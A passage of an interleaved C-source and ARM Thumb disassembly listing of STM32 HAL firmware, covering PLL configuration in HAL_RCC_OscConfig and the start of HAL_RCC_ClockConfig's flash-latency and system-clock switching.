 8003f4c:	697b      	ldr	r3, [r7, #20]
 8003f4e:	f003 0203 	and.w	r2, r3, #3
 8003f52:	687b      	ldr	r3, [r7, #4]
 8003f54:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003f56:	429a      	cmp	r2, r3
 8003f58:	d12c      	bne.n	8003fb4 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f5a:	697b      	ldr	r3, [r7, #20]
 8003f5c:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003f60:	687b      	ldr	r3, [r7, #4]
 8003f62:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003f64:	3b01      	subs	r3, #1
 8003f66:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003f68:	429a      	cmp	r2, r3
 8003f6a:	d123      	bne.n	8003fb4 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f6c:	697b      	ldr	r3, [r7, #20]
 8003f6e:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003f72:	687b      	ldr	r3, [r7, #4]
 8003f74:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003f76:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f78:	429a      	cmp	r2, r3
 8003f7a:	d11b      	bne.n	8003fb4 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f7c:	697b      	ldr	r3, [r7, #20]
 8003f7e:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003f82:	687b      	ldr	r3, [r7, #4]
 8003f84:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003f86:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f88:	429a      	cmp	r2, r3
 8003f8a:	d113      	bne.n	8003fb4 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f8c:	697b      	ldr	r3, [r7, #20]
 8003f8e:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f92:	687b      	ldr	r3, [r7, #4]
 8003f94:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f96:	085b      	lsrs	r3, r3, #1
 8003f98:	3b01      	subs	r3, #1
 8003f9a:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f9c:	429a      	cmp	r2, r3
 8003f9e:	d109      	bne.n	8003fb4 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003fa0:	697b      	ldr	r3, [r7, #20]
 8003fa2:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003fa6:	687b      	ldr	r3, [r7, #4]
 8003fa8:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003faa:	085b      	lsrs	r3, r3, #1
 8003fac:	3b01      	subs	r3, #1
 8003fae:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003fb0:	429a      	cmp	r2, r3
 8003fb2:	d06b      	beq.n	800408c <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003fb4:	69bb      	ldr	r3, [r7, #24]
 8003fb6:	2b0c      	cmp	r3, #12
 8003fb8:	d062      	beq.n	8004080 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003fba:	4b32      	ldr	r3, [pc, #200]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003fbc:	681b      	ldr	r3, [r3, #0]
 8003fbe:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003fc2:	2b00      	cmp	r3, #0
 8003fc4:	d001      	beq.n	8003fca <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003fc6:	2301      	movs	r3, #1
 8003fc8:	e0ac      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003fca:	4b2e      	ldr	r3, [pc, #184]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003fcc:	681b      	ldr	r3, [r3, #0]
 8003fce:	4a2d      	ldr	r2, [pc, #180]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003fd0:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003fd4:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003fd6:	f7fd f915 	bl	8001204 <HAL_GetTick>
 8003fda:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003fdc:	e008      	b.n	8003ff0 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fde:	f7fd f911 	bl	8001204 <HAL_GetTick>
 8003fe2:	4602      	mov	r2, r0
 8003fe4:	693b      	ldr	r3, [r7, #16]
 8003fe6:	1ad3      	subs	r3, r2, r3
 8003fe8:	2b02      	cmp	r3, #2
 8003fea:	d901      	bls.n	8003ff0 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003fec:	2303      	movs	r3, #3
 8003fee:	e099      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003ff0:	4b24      	ldr	r3, [pc, #144]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ff2:	681b      	ldr	r3, [r3, #0]
 8003ff4:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003ff8:	2b00      	cmp	r3, #0
 8003ffa:	d1f0      	bne.n	8003fde <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003ffc:	4b21      	ldr	r3, [pc, #132]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8003ffe:	68da      	ldr	r2, [r3, #12]
 8004000:	4b21      	ldr	r3, [pc, #132]	; (8004088 <HAL_RCC_OscConfig+0x77c>)
 8004002:	4013      	ands	r3, r2
 8004004:	687a      	ldr	r2, [r7, #4]
 8004006:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8004008:	687a      	ldr	r2, [r7, #4]
 800400a:	6b12      	ldr	r2, [r2, #48]	; 0x30
 800400c:	3a01      	subs	r2, #1
 800400e:	0112      	lsls	r2, r2, #4
 8004010:	4311      	orrs	r1, r2
 8004012:	687a      	ldr	r2, [r7, #4]
 8004014:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8004016:	0212      	lsls	r2, r2, #8
 8004018:	4311      	orrs	r1, r2
 800401a:	687a      	ldr	r2, [r7, #4]
 800401c:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 800401e:	0852      	lsrs	r2, r2, #1
 8004020:	3a01      	subs	r2, #1
 8004022:	0552      	lsls	r2, r2, #21
 8004024:	4311      	orrs	r1, r2
 8004026:	687a      	ldr	r2, [r7, #4]
 8004028:	6c12      	ldr	r2, [r2, #64]	; 0x40
 800402a:	0852      	lsrs	r2, r2, #1
 800402c:	3a01      	subs	r2, #1
 800402e:	0652      	lsls	r2, r2, #25
 8004030:	4311      	orrs	r1, r2
 8004032:	687a      	ldr	r2, [r7, #4]
 8004034:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8004036:	06d2      	lsls	r2, r2, #27
 8004038:	430a      	orrs	r2, r1
 800403a:	4912      	ldr	r1, [pc, #72]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 800403c:	4313      	orrs	r3, r2
 800403e:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8004040:	4b10      	ldr	r3, [pc, #64]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8004042:	681b      	ldr	r3, [r3, #0]
 8004044:	4a0f      	ldr	r2, [pc, #60]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8004046:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800404a:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 800404c:	4b0d      	ldr	r3, [pc, #52]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 800404e:	68db      	ldr	r3, [r3, #12]
 8004050:	4a0c      	ldr	r2, [pc, #48]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8004052:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004056:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8004058:	f7fd f8d4 	bl	8001204 <HAL_GetTick>
 800405c:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800405e:	e008      	b.n	8004072 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004060:	f7fd f8d0 	bl	8001204 <HAL_GetTick>
 8004064:	4602      	mov	r2, r0
 8004066:	693b      	ldr	r3, [r7, #16]
 8004068:	1ad3      	subs	r3, r2, r3
 800406a:	2b02      	cmp	r3, #2
 800406c:	d901      	bls.n	8004072 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 800406e:	2303      	movs	r3, #3
 8004070:	e058      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004072:	4b04      	ldr	r3, [pc, #16]	; (8004084 <HAL_RCC_OscConfig+0x778>)
 8004074:	681b      	ldr	r3, [r3, #0]
 8004076:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800407a:	2b00      	cmp	r3, #0
 800407c:	d0f0      	beq.n	8004060 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 800407e:	e050      	b.n	8004122 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8004080:	2301      	movs	r3, #1
 8004082:	e04f      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
 8004084:	40021000 	.word	0x40021000
 8004088:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800408c:	4b27      	ldr	r3, [pc, #156]	; (800412c <HAL_RCC_OscConfig+0x820>)
 800408e:	681b      	ldr	r3, [r3, #0]
 8004090:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004094:	2b00      	cmp	r3, #0
 8004096:	d144      	bne.n	8004122 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004098:	4b24      	ldr	r3, [pc, #144]	; (800412c <HAL_RCC_OscConfig+0x820>)
 800409a:	681b      	ldr	r3, [r3, #0]
 800409c:	4a23      	ldr	r2, [pc, #140]	; (800412c <HAL_RCC_OscConfig+0x820>)
 800409e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80040a2:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 80040a4:	4b21      	ldr	r3, [pc, #132]	; (800412c <HAL_RCC_OscConfig+0x820>)
 80040a6:	68db      	ldr	r3, [r3, #12]
 80040a8:	4a20      	ldr	r2, [pc, #128]	; (800412c <HAL_RCC_OscConfig+0x820>)
 80040aa:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80040ae:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 80040b0:	f7fd f8a8 	bl	8001204 <HAL_GetTick>
 80040b4:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80040b6:	e008      	b.n	80040ca <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80040b8:	f7fd f8a4 	bl	8001204 <HAL_GetTick>
 80040bc:	4602      	mov	r2, r0
 80040be:	693b      	ldr	r3, [r7, #16]
 80040c0:	1ad3      	subs	r3, r2, r3
 80040c2:	2b02      	cmp	r3, #2
 80040c4:	d901      	bls.n	80040ca <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 80040c6:	2303      	movs	r3, #3
 80040c8:	e02c      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80040ca:	4b18      	ldr	r3, [pc, #96]	; (800412c <HAL_RCC_OscConfig+0x820>)
 80040cc:	681b      	ldr	r3, [r3, #0]
 80040ce:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80040d2:	2b00      	cmp	r3, #0
 80040d4:	d0f0      	beq.n	80040b8 <HAL_RCC_OscConfig+0x7ac>
 80040d6:	e024      	b.n	8004122 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 80040d8:	69bb      	ldr	r3, [r7, #24]
 80040da:	2b0c      	cmp	r3, #12
 80040dc:	d01f      	beq.n	800411e <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 80040de:	4b13      	ldr	r3, [pc, #76]	; (800412c <HAL_RCC_OscConfig+0x820>)
 80040e0:	681b      	ldr	r3, [r3, #0]
 80040e2:	4a12      	ldr	r2, [pc, #72]	; (800412c <HAL_RCC_OscConfig+0x820>)
 80040e4:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 80040e8:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80040ea:	f7fd f88b 	bl	8001204 <HAL_GetTick>
 80040ee:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80040f0:	e008      	b.n	8004104 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80040f2:	f7fd f887 	bl	8001204 <HAL_GetTick>
 80040f6:	4602      	mov	r2, r0
 80040f8:	693b      	ldr	r3, [r7, #16]
 80040fa:	1ad3      	subs	r3, r2, r3
 80040fc:	2b02      	cmp	r3, #2
 80040fe:	d901      	bls.n	8004104 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004100:	2303      	movs	r3, #3
 8004102:	e00f      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004104:	4b09      	ldr	r3, [pc, #36]	; (800412c <HAL_RCC_OscConfig+0x820>)
 8004106:	681b      	ldr	r3, [r3, #0]
 8004108:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800410c:	2b00      	cmp	r3, #0
 800410e:	d1f0      	bne.n	80040f2 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004110:	4b06      	ldr	r3, [pc, #24]	; (800412c <HAL_RCC_OscConfig+0x820>)
 8004112:	68da      	ldr	r2, [r3, #12]
 8004114:	4905      	ldr	r1, [pc, #20]	; (800412c <HAL_RCC_OscConfig+0x820>)
 8004116:	4b06      	ldr	r3, [pc, #24]	; (8004130 <HAL_RCC_OscConfig+0x824>)
 8004118:	4013      	ands	r3, r2
 800411a:	60cb      	str	r3, [r1, #12]
 800411c:	e001      	b.n	8004122 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 800411e:	2301      	movs	r3, #1
 8004120:	e000      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 8004122:	2300      	movs	r3, #0
}
 8004124:	4618      	mov	r0, r3
 8004126:	3720      	adds	r7, #32
 8004128:	46bd      	mov	sp, r7
 800412a:	bd80      	pop	{r7, pc}
 800412c:	40021000 	.word	0x40021000
 8004130:	feeefffc 	.word	0xfeeefffc

08004134 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 8004134:	b580      	push	{r7, lr}
 8004136:	b084      	sub	sp, #16
 8004138:	af00      	add	r7, sp, #0
 800413a:	6078      	str	r0, [r7, #4]
 800413c:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 800413e:	687b      	ldr	r3, [r7, #4]
 8004140:	2b00      	cmp	r3, #0
 8004142:	d101      	bne.n	8004148 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 8004144:	2301      	movs	r3, #1
 8004146:	e0e7      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 8004148:	4b75      	ldr	r3, [pc, #468]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 800414a:	681b      	ldr	r3, [r3, #0]
 800414c:	f003 0307 	and.w	r3, r3, #7
 8004150:	683a      	ldr	r2, [r7, #0]
 8004152:	429a      	cmp	r2, r3
 8004154:	d910      	bls.n	8004178 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004156:	4b72      	ldr	r3, [pc, #456]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 8004158:	681b      	ldr	r3, [r3, #0]
 800415a:	f023 0207 	bic.w	r2, r3, #7
 800415e:	4970      	ldr	r1, [pc, #448]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 8004160:	683b      	ldr	r3, [r7, #0]
 8004162:	4313      	orrs	r3, r2
 8004164:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004166:	4b6e      	ldr	r3, [pc, #440]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 8004168:	681b      	ldr	r3, [r3, #0]
 800416a:	f003 0307 	and.w	r3, r3, #7
 800416e:	683a      	ldr	r2, [r7, #0]
 8004170:	429a      	cmp	r2, r3
 8004172:	d001      	beq.n	8004178 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004174:	2301      	movs	r3, #1
 8004176:	e0cf      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004178:	687b      	ldr	r3, [r7, #4]
 800417a:	681b      	ldr	r3, [r3, #0]
 800417c:	f003 0302 	and.w	r3, r3, #2
 8004180:	2b00      	cmp	r3, #0
 8004182:	d010      	beq.n	80041a6 <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004184:	687b      	ldr	r3, [r7, #4]
 8004186:	689a      	ldr	r2, [r3, #8]
 8004188:	4b66      	ldr	r3, [pc, #408]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 800418a:	689b      	ldr	r3, [r3, #8]
 800418c:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004190:	429a      	cmp	r2, r3
 8004192:	d908      	bls.n	80041a6 <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004194:	4b63      	ldr	r3, [pc, #396]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 8004196:	689b      	ldr	r3, [r3, #8]
 8004198:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800419c:	687b      	ldr	r3, [r7, #4]
 800419e:	689b      	ldr	r3, [r3, #8]
 80041a0:	4960      	ldr	r1, [pc, #384]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80041a2:	4313      	orrs	r3, r2
 80041a4:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 80041a6:	687b      	ldr	r3, [r7, #4]
 80041a8:	681b      	ldr	r3, [r3, #0]
 80041aa:	f003 0301 	and.w	r3, r3, #1
 80041ae:	2b00      	cmp	r3, #0
 80041b0:	d04c      	beq.n	800424c <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 80041b2:	687b      	ldr	r3, [r7, #4]
 80041b4:	685b      	ldr	r3, [r3, #4]
 80041b6:	2b03      	cmp	r3, #3
 80041b8:	d107      	bne.n	80041ca <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041ba:	4b5a      	ldr	r3, [pc, #360]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80041bc:	681b      	ldr	r3, [r3, #0]
 80041be:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041c2:	2b00      	cmp	r3, #0
 80041c4:	d121      	bne.n	800420a <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 80041c6:	2301      	movs	r3, #1
 80041c8:	e0a6      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 80041ca:	687b      	ldr	r3, [r7, #4]
 80041cc:	685b      	ldr	r3, [r3, #4]
 80041ce:	2b02      	cmp	r3, #2
 80041d0:	d107      	bne.n	80041e2 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 80041d2:	4b54      	ldr	r3, [pc, #336]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80041d4:	681b      	ldr	r3, [r3, #0]
 80041d6:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80041da:	2b00      	cmp	r3, #0
 80041dc:	d115      	bne.n	800420a <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041de:	2301      	movs	r3, #1
 80041e0:	e09a      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 80041e2:	687b      	ldr	r3, [r7, #4]
 80041e4:	685b      	ldr	r3, [r3, #4]
 80041e6:	2b00      	cmp	r3, #0
 80041e8:	d107      	bne.n	80041fa <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 80041ea:	4b4e      	ldr	r3, [pc, #312]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80041ec:	681b      	ldr	r3, [r3, #0]
 80041ee:	f003 0302 	and.w	r3, r3, #2
 80041f2:	2b00      	cmp	r3, #0
 80041f4:	d109      	bne.n	800420a <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041f6:	2301      	movs	r3, #1
 80041f8:	e08e      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 80041fa:	4b4a      	ldr	r3, [pc, #296]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80041fc:	681b      	ldr	r3, [r3, #0]
 80041fe:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004202:	2b00      	cmp	r3, #0
 8004204:	d101      	bne.n	800420a <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004206:	2301      	movs	r3, #1
 8004208:	e086      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 800420a:	4b46      	ldr	r3, [pc, #280]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 800420c:	689b      	ldr	r3, [r3, #8]
 800420e:	f023 0203 	bic.w	r2, r3, #3
 8004212:	687b      	ldr	r3, [r7, #4]
 8004214:	685b      	ldr	r3, [r3, #4]
 8004216:	4943      	ldr	r1, [pc, #268]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 8004218:	4313      	orrs	r3, r2
 800421a:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 800421c:	f7fc fff2 	bl	8001204 <HAL_GetTick>
 8004220:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 8004222:	e00a      	b.n	800423a <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 8004224:	f7fc ffee 	bl	8001204 <HAL_GetTick>
 8004228:	4602      	mov	r2, r0
 800422a:	68fb      	ldr	r3, [r7, #12]
 800422c:	1ad3      	subs	r3, r2, r3
 800422e:	f241 3288 	movw	r2, #5000	; 0x1388
 8004232:	4293      	cmp	r3, r2
